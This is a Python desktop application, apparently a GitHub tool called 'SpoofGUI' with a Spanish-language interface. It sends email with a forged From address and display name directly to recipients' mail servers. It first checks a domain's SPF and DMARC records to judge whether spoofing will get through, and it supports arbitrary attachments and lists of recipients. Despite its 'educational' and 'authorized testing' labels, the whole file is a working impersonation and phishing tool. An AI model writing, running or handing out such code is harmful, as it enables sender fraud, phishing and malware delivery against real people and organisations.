#!/usr/bin/env python3
# spoofgui.py — Email Spoofing Demo Tool | DEF CON Edition
# Author: GitoCode  |  github.com/GitoCode
# Educational use only. Requires: pip install dnspython

import json, os, queue, threading, tkinter as tk
from tkinter import ttk, filedialog, messagebox
from email.message import EmailMessage
from email.utils import formatdate, make_msgid
import smtplib

try:
    import dns.resolver
except ImportError:
    dns = None

CONFIG = os.path.join(os.path.expanduser("~"), "spoofgui.json")

# ── Paleta ─────────────────────────────────────────────────────────────────────
C = {
    "bg":           "#0d1117",
    "panel":        "#161b22",
    "border":       "#30363d",
    "accent":       "#7c3aed",
    "accent_hover": "#9d5cf5",
    "ghost":        "#21262d",
    "ghost_hover":  "#30363d",
    "danger":       "#ef4444",
    "fg":           "#e6edf3",
    "fg_dim":       "#8b949e",
    "input_bg":     "#0d1117",
    "log_bg":       "#010409",
    "tag_ok":       "#22c55e",
    "tag_warn":     "#f59e0b",
    "tag_err":      "#ef4444",
    "tag_info":     "#7c3aed",
    "tag_smtp":     "#38bdf8",
}

FONT_MONO  = ("Consolas", 9)
FONT_UI    = ("Segoe UI", 9)
FONT_LABEL = ("Segoe UI", 8)


# ── DNS helpers ────────────────────────────────────────────────────────────────

def mx_for(domain: str) -> list[str]:
    if dns:
        try:
            ans = sorted(dns.resolver.resolve(domain, "MX"),
                         key=lambda r: r.preference)
            out = [str(r.exchange).rstrip(".") for r in ans]
            if out:
                return out
        except Exception:
            pass
    return [domain]


def dns_verdict(domain: str):
    spf = dmarc = None
    if dns:
        try:
            for r in dns.resolver.resolve(domain, "TXT"):
                t = r.to_text().strip('"')
                if t.startswith("v=spf1"):
                    spf = t
        except Exception:
            pass
        try:
            for r in dns.resolver.resolve(f"_dmarc.{domain}", "TXT"):
                t = r.to_text().strip('"')
                if t.startswith("v=DMARC1"):
                    dmarc = t
        except Exception:
            pass

    if not spf and not dmarc:
        return spf, dmarc, "LIBRE", C["tag_ok"], "●"
    if dmarc and "p=none" in dmarc:
        return spf, dmarc, "DMARC SIN POLÍTICA", C["tag_warn"], "◑"
    if dmarc and ("p=reject" in dmarc or "p=quarantine" in dmarc):
        return spf, dmarc, "POLÍTICA DURA", C["tag_err"], "■"
    return spf, dmarc, "SPF PRESENTE", C["tag_warn"], "◑"


# ── SMTP con logging ───────────────────────────────────────────────────────────

class LoggingSMTP(smtplib.SMTP):
    def __init__(self, *a, logfn=None, **kw):
        self._logfn = logfn
        super().__init__(*a, **kw)

    def _print_debug(self, *args):
        if self._logfn:
            self._logfn("   " + " ".join(str(x) for x in args), "smtp")


# ── Widgets helpers ────────────────────────────────────────────────────────────

def make_btn(parent, text, command, variant="ghost"):
    """
    Botón tk.Button con colores del tema y hover.
    variant: "accent" | "ghost" | "danger"
    """
    colors = {
        "accent": (C["accent"],       C["accent_hover"]),
        "ghost":  (C["ghost"],        C["ghost_hover"]),
        "danger": (C["danger"],        "#f87171"),
    }
    bg, bg_h = colors.get(variant, colors["ghost"])

    btn = tk.Button(
        parent,
        text=text,
        command=command,
        bg=bg,
        fg=C["fg"],
        activebackground=bg_h,
        activeforeground=C["fg"],
        relief="flat",
        bd=0,
        padx=10,
        pady=5,
        font=FONT_UI,
        cursor="hand2",
    )
    btn.bind("<Enter>", lambda e: btn.config(bg=bg_h))
    btn.bind("<Leave>", lambda e: btn.config(bg=bg))
    return btn


def make_entry(parent, textvariable, **kw):
    return tk.Entry(
        parent,
        textvariable=textvariable,
        bg=C["input_bg"],
        fg=C["fg"],
        insertbackground=C["fg"],
        relief="flat",
        bd=0,
        highlightbackground=C["border"],
        highlightcolor=C["accent"],
        highlightthickness=1,
        font=FONT_UI,
        **kw,
    )


def make_text(parent, height, **kw):
    return tk.Text(
        parent,
        height=height,
        bg=C["input_bg"],
        fg=C["fg"],
        insertbackground=C["fg"],
        relief="flat",
        bd=0,
        highlightbackground=C["border"],
        highlightcolor=C["accent"],
        highlightthickness=1,
        font=FONT_MONO,
        selectbackground=C["accent"],
        **kw,
    )


def make_label(parent, text, dim=False, bold=False):
    font = ("Segoe UI Semibold", 8) if bold else FONT_LABEL
    return tk.Label(
        parent,
        text=text,
        bg=parent.cget("bg"),
        fg=C["fg_dim"] if dim else C["fg"],
        font=font,
    )


class Section(tk.Frame):
    """Frame con fondo panel, borde y título opcional."""
    def __init__(self, parent, title="", **kw):
        super().__init__(parent, bg=C["panel"],
                         highlightbackground=C["border"],
                         highlightthickness=1, **kw)
        if title:
            tk.Label(self, text=title, bg=C["panel"], fg=C["fg_dim"],
                     font=("Segoe UI", 7)).pack(anchor="w", padx=8, pady=(5, 1))


# ── App ────────────────────────────────────────────────────────────────────────

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("SpoofGUI  ·  DEF CON Edition  ·  GitoCode")
        self.geometry("1200x820")
        self.minsize(960, 660)
        self.configure(bg=C["bg"])
        self.q = queue.Queue()
        self._build()
        self.after(100, self._drain)

    # ── layout principal ───────────────────────────────────────────────────────

    def _build(self):
        self._build_header()

        body = tk.Frame(self, bg=C["bg"])
        body.pack(fill="both", expand=True, padx=12, pady=(6, 0))
        body.columnconfigure(0, weight=0, minsize=430)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        self._build_left(body)
        self._build_right(body)
        self._build_statusbar()

    def _build_header(self):
        hdr = tk.Frame(self, bg=C["panel"],
                       highlightbackground=C["border"], highlightthickness=1)
        hdr.pack(fill="x")
        tk.Label(hdr, text="⚡ SpoofGUI", bg=C["panel"], fg=C["accent"],
                 font=("Segoe UI Semibold", 13)).pack(side="left", padx=14, pady=9)
        tk.Label(hdr, text="DEF CON Edition  |  Educational Use Only",
                 bg=C["panel"], fg=C["fg_dim"], font=FONT_UI).pack(side="left")
        tk.Label(hdr, text="by GitoCode", bg=C["panel"], fg=C["fg_dim"],
                 font=FONT_LABEL).pack(side="right", padx=14)

    def _build_left(self, parent):
        left = tk.Frame(parent, bg=C["bg"])
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 8), pady=8)

        # cabeceras
        s1 = Section(left, title="CABECERAS DEL MENSAJE")
        s1.pack(fill="x", pady=(0, 5))
        self.v_name = tk.StringVar()
        self.v_from = tk.StringVar()
        self.v_subj = tk.StringVar()
        for label, var in [("Nombre visible", self.v_name),
                            ("From (spoofeado)", self.v_from),
                            ("Asunto", self.v_subj)]:
            f = tk.Frame(s1, bg=C["panel"])
            f.pack(fill="x", padx=8, pady=2)
            make_label(f, label).pack(anchor="w")
            make_entry(f, var).pack(fill="x", pady=(1, 0))

        # smtp
        s2 = Section(left, title="CONFIGURACIÓN SMTP")
        s2.pack(fill="x", pady=(0, 5))
        self.v_helo = tk.StringVar(value="mail.example.com")
        self.v_mx   = tk.StringVar()
        for label, var in [("HELO / PTR hostname", self.v_helo),
                            ("MX override  (vacío = auto)", self.v_mx)]:
            f = tk.Frame(s2, bg=C["panel"])
            f.pack(fill="x", padx=8, pady=2)
            make_label(f, label).pack(anchor="w")
            make_entry(f, var).pack(fill="x", pady=(1, 0))

        # destinatarios
        s3 = Section(left, title="DESTINATARIOS  (uno por línea)")
        s3.pack(fill="x", pady=(0, 5))
        self.t_dest = make_text(s3, height=4)
        self.t_dest.pack(fill="x", padx=8, pady=(0, 8))

        # cuerpo
        s4 = Section(left, title="CUERPO DEL MENSAJE")
        s4.pack(fill="both", expand=True, pady=(0, 5))
        self.t_body = make_text(s4, height=7)
        self.t_body.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        # adjunto
        s5 = Section(left, title="ADJUNTO  (opcional)")
        s5.pack(fill="x", pady=(0, 5))
        self.v_att = tk.StringVar()
        att_row = tk.Frame(s5, bg=C["panel"])
        att_row.pack(fill="x", padx=8, pady=(2, 8))
        make_entry(att_row, self.v_att).pack(side="left", fill="x", expand=True, padx=(0, 6))
        make_btn(att_row, "Examinar…", self._pick, "ghost").pack(side="left")

        # veredicto
        vrow = tk.Frame(left, bg=C["bg"])
        vrow.pack(fill="x", pady=(2, 4))
        self.lbl_verdict_dot = tk.Label(vrow, text="●", bg=C["bg"],
                                        fg=C["fg_dim"], font=("Segoe UI", 11))
        self.lbl_verdict_dot.pack(side="left")
        self.lbl_verdict = tk.Label(vrow, text="  sin analizar",
                                    bg=C["bg"], fg=C["fg_dim"], font=FONT_UI)
        self.lbl_verdict.pack(side="left")

        # botones acción
        btn_row = tk.Frame(left, bg=C["bg"])
        btn_row.pack(fill="x", pady=(2, 3))
        make_btn(btn_row, "⬡  Comprobar dominio", self._check,  "ghost" ).pack(side="left", padx=(0, 4))
        make_btn(btn_row, "⬡  Puerto 25",          self._test_port, "ghost" ).pack(side="left", padx=(0, 4))
        make_btn(btn_row, "➤  ENVIAR",              self._send,  "accent").pack(side="left")

        # guardar / cargar
        sc_row = tk.Frame(left, bg=C["bg"])
        sc_row.pack(fill="x", pady=(3, 6))
        make_btn(sc_row, "↓  Guardar", self._save, "ghost").pack(side="right", padx=(4, 0))
        make_btn(sc_row, "↑  Cargar",  self._load, "ghost").pack(side="right")

    def _build_right(self, parent):
        right = tk.Frame(parent, bg=C["bg"])
        right.grid(row=0, column=1, sticky="nsew", pady=8)
        right.rowconfigure(1, weight=1)
        right.columnconfigure(0, weight=1)

        # cabecera del log
        log_hdr = tk.Frame(right, bg=C["panel"],
                           highlightbackground=C["border"], highlightthickness=1)
        log_hdr.grid(row=0, column=0, sticky="ew")
        tk.Label(log_hdr, text="SMTP  LOG", bg=C["panel"], fg=C["fg_dim"],
                 font=("Segoe UI", 7)).pack(side="left", padx=10, pady=5)
        make_btn(log_hdr, "✕  Limpiar", self._clear_log, "ghost").pack(
            side="right", padx=6, pady=4)

        # área de log
        log_frame = tk.Frame(right, bg=C["log_bg"],
                             highlightbackground=C["border"], highlightthickness=1)
        log_frame.grid(row=1, column=0, sticky="nsew", pady=(1, 0))
        log_frame.rowconfigure(0, weight=1)
        log_frame.columnconfigure(0, weight=1)

        self.log = tk.Text(log_frame, bg=C["log_bg"], fg=C["fg"],
                           insertbackground=C["fg"],
                           font=FONT_MONO, wrap="word",
                           relief="flat", bd=0,
                           selectbackground=C["accent"])
        sb = tk.Scrollbar(log_frame, command=self.log.yview,
                          bg=C["panel"], troughcolor=C["bg"],
                          activebackground=C["accent"])
        self.log.configure(yscrollcommand=sb.set)
        sb.grid(row=0, column=1, sticky="ns")
        self.log.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)

        for tag, color in [("ok",   C["tag_ok"]),
                            ("err",  C["tag_err"]),
                            ("warn", C["tag_warn"]),
                            ("info", C["tag_info"]),
                            ("smtp", C["tag_smtp"]),
                            ("dim",  C["fg_dim"])]:
            self.log.tag_config(tag, foreground=color)

        self._log("SpoofGUI iniciado. Listo.", "dim")
        if not dns:
            self._log("[!] dnspython no instalado — DNS deshabilitado.", "warn")

    def _build_statusbar(self):
        self.status_var = tk.StringVar(value="Listo")
        bar = tk.Frame(self, bg=C["panel"],
                       highlightbackground=C["border"], highlightthickness=1)
        bar.pack(fill="x", side="bottom")
        tk.Label(bar, textvariable=self.status_var, bg=C["panel"],
                 fg=C["fg_dim"], font=FONT_LABEL).pack(side="left", padx=10, pady=4)
        tk.Label(bar, text="⚠  FOR AUTHORIZED TESTING ONLY",
                 bg=C["panel"], fg=C["tag_err"], font=FONT_LABEL).pack(side="right", padx=10)

    # ── utilidades ─────────────────────────────────────────────────────────────

    def _log(self, txt: str, tag: str = ""):
        if not tag:
            if txt.startswith("[ok]") or "aceptado" in txt:
                tag = "ok"
            elif txt.startswith("[!]") or "rechazado" in txt or "fallido" in txt:
                tag = "err"
            elif txt.startswith("[*]") or txt.startswith("[=]"):
                tag = "info"
            elif txt.startswith("[?]"):
                tag = "warn"
        self.q.put((txt, tag))

    def _drain(self):
        while not self.q.empty():
            txt, tag = self.q.get()
            self.log.insert("end", txt + "\n", tag or ())
            self.log.see("end")
        self.after(100, self._drain)

    def _clear_log(self):
        self.log.delete("1.0", "end")

    def _status(self, msg: str):
        self.status_var.set(msg)

    def _pick(self):
        p = filedialog.askopenfilename()
        if p:
            self.v_att.set(p)

    def _recips(self) -> list[str]:
        return [x.strip() for x in self.t_dest.get("1.0", "end").splitlines() if "@" in x]

    # ── acciones ───────────────────────────────────────────────────────────────

    def _check(self):
        d = self.v_from.get().split("@")[-1].strip()
        if not d:
            return messagebox.showwarning("Falta", "Escribe primero una dirección From.")
        if not dns:
            return messagebox.showerror("Sin DNS", "Instala dnspython:\n  pip install dnspython")
        self._status(f"Consultando DNS para {d}…")

        def work():
            spf, dmarc, verdict, color, dot = dns_verdict(d)
            self._log(f"[?] {d}", "warn")
            self._log(f"    SPF  : {spf  or 'ninguno'}", "dim")
            self._log(f"    DMARC: {dmarc or 'ninguno'}", "dim")
            tag = {C["tag_ok"]: "ok", C["tag_warn"]: "warn", C["tag_err"]: "err"}.get(color, "info")
            self.after(0, lambda: self.lbl_verdict_dot.configure(fg=color, text=dot))
            self.after(0, lambda: self.lbl_verdict.configure(text=f"  {d}  →  {verdict}", fg=color))
            self._log(f"[=] Veredicto: {verdict}", tag)
            self.after(0, lambda: self._status(f"Veredicto: {verdict}"))
        threading.Thread(target=work, daemon=True).start()

    def _test_port(self):
        d    = self.v_from.get().split("@")[-1].strip() or "gmail.com"
        helo = self.v_helo.get().strip() or "localhost"
        self._status(f"Probando puerto 25 → {d}…")

        def work():
            for mx in mx_for(d):
                self._log(f"[*] {mx}:25 …", "info")
                try:
                    s = LoggingSMTP(mx, 25, local_hostname=helo, timeout=15, logfn=self._log)
                    s.set_debuglevel(1)
                    s.ehlo(helo)
                    s.quit()
                    self._log(f"[ok] {mx} acepta conexión directa", "ok")
                    self.after(0, lambda m=mx: self._status(f"Puerto 25 abierto en {m}"))
                    return
                except Exception as e:
                    self._log(f"[!] {mx}: {e}", "err")
            self._log("[!] Ningún MX respondió. Puerto 25 saliente bloqueado.", "err")
            self.after(0, lambda: self._status("Puerto 25 bloqueado o sin respuesta."))
        threading.Thread(target=work, daemon=True).start()

    def _send(self):
        addr  = self.v_from.get().strip()
        rcpts = self._recips()
        if "@" not in addr or not rcpts:
            return messagebox.showwarning("Faltan datos",
                                          "Necesitas From y al menos un destinatario.")
        name     = self.v_name.get().strip()
        helo     = self.v_helo.get().strip() or "localhost"
        subj     = self.v_subj.get().strip()
        body     = self.t_body.get("1.0", "end").rstrip()
        att      = self.v_att.get().strip()
        override = self.v_mx.get().strip()
        domain   = addr.split("@")[-1]

        msg = EmailMessage()
        msg["From"]       = f'"{name}" <{addr}>' if name else addr
        msg["Subject"]    = subj
        msg["Date"]       = formatdate(localtime=True)
        msg["Message-ID"] = make_msgid(domain=domain)
        msg.set_content(body)
        if att and os.path.isfile(att):
            with open(att, "rb") as f:
                msg.add_attachment(f.read(), maintype="application",
                                   subtype="octet-stream",
                                   filename=os.path.basename(att))

        mxs = [override] if override else mx_for(domain)
        self._status(f"Enviando a {len(rcpts)} destinatario(s)…")
        self._log(f"\n[>] Inicio de envío → {addr}  ({len(rcpts)} rcpt)", "info")

        def work():
            ok = fail = 0
            for rcpt in rcpts:
                self._log(f"\n  → {rcpt}", "dim")
                sent = False
                for mx in mxs:
                    try:
                        s = LoggingSMTP(mx, 25, local_hostname=helo,
                                        timeout=30, logfn=self._log)
                        s.set_debuglevel(1)
                        s.sendmail(addr, [rcpt], msg.as_string())
                        s.quit()
                        self._log(f"[ok] entregado vía {mx}", "ok")
                        ok += 1; sent = True; break
                    except smtplib.SMTPRecipientsRefused as e:
                        self._log(f"[!] rechazado: {e.recipients}", "err")
                        fail += 1; sent = True; break
                    except Exception as e:
                        self._log(f"[!] {mx}: {e}", "err")
                if not sent:
                    fail += 1
            summ = f"\n[=] Resumen: {ok} aceptado(s)  /  {fail} fallido(s)"
            self._log(summ, "ok" if fail == 0 else "warn")
            self.after(0, lambda: self._status(f"Fin: {ok} OK, {fail} fallidos"))
        threading.Thread(target=work, daemon=True).start()

    def _save(self):
        data = dict(name=self.v_name.get(), frm=self.v_from.get(),
                    helo=self.v_helo.get(), mx=self.v_mx.get(),
                    subj=self.v_subj.get(),
                    body=self.t_body.get("1.0", "end"),
                    dest=self.t_dest.get("1.0", "end"))
        with open(CONFIG, "w") as fh:
            json.dump(data, fh, indent=2)
        self._log(f"[*] Guardado → {CONFIG}", "info")
        self._status("Configuración guardada.")

    def _load(self):
        try:
            with open(CONFIG) as fh:
                d = json.load(fh)
        except Exception:
            return messagebox.showerror("Error", "No hay configuración guardada.")
        self.v_name.set(d.get("name", ""))
        self.v_from.set(d.get("frm",  ""))
        self.v_helo.set(d.get("helo", ""))
        self.v_mx.set(d.get("mx",   ""))
        self.v_subj.set(d.get("subj", ""))
        self.t_body.delete("1.0", "end"); self.t_body.insert("1.0", d.get("body", ""))
        self.t_dest.delete("1.0", "end"); self.t_dest.insert("1.0", d.get("dest", ""))
        self._log("[*] Configuración cargada.", "info")
        self._status("Configuración cargada.")


if __name__ == "__main__":
    App().mainloop()
